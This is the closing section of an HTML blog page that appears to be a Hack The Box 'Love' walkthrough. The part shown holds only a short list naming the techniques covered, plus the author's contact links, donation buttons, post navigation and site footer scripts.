+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>gobuster fuzz dir path</li>
+<li>Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)</li>
+<li>privesc through AlwaysInstallElevated</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/05/03/love/" title="Hack-The-Box-walkthrough[Love]">https://fdlucifer.github.io/2021/05/03/love/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/01/monitors/" rel="prev" title="Hack-The-Box-walkthrough[Monitors]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[Monitors]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/05/08/proper/" rel="next" title="Hack-The-Box-walkthrough[proper]">
+                  Hack-The-Box-walkthrough[proper] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
